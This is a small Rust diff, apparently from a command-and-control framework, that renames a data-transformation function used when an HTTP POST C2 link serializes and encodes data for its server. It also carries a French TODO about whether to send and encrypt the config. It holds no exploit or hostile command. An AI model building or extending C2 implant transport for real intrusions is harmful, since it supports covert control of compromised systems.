@@ -1,4 +1,4 @@
-use crate::dataoperation::{apply_all_dataoperations_bis, DataOperation, UnApplyDataOperation};
+use crate::dataoperation::{apply_all_dataoperations, DataOperation, UnApplyDataOperation};
 use crate::poollink::Advanced;
 use anyhow::bail;
 use anyhow::Result;
@@ -450,7 +450,7 @@ impl LinkFetch for HTTPPostC2Link {
             //running_thread: running_thread.clone(),
         };
         let post_data_bytes= serde_json::to_vec(&post_data).unwrap();
-        let m: Vec<u8>  = apply_all_dataoperations_bis(&mut self.dataoperation_post.clone() , post_data_bytes).unwrap();
+        let m: Vec<u8>  = apply_all_dataoperations(&mut self.dataoperation_post.clone() , post_data_bytes).unwrap();
 
         // TODO reflechir. est-ce qu'on envoit la config ?? c'est lourd et il faudrait la chiffrer a fond
         //map.insert("config", format!("{:?}", config));
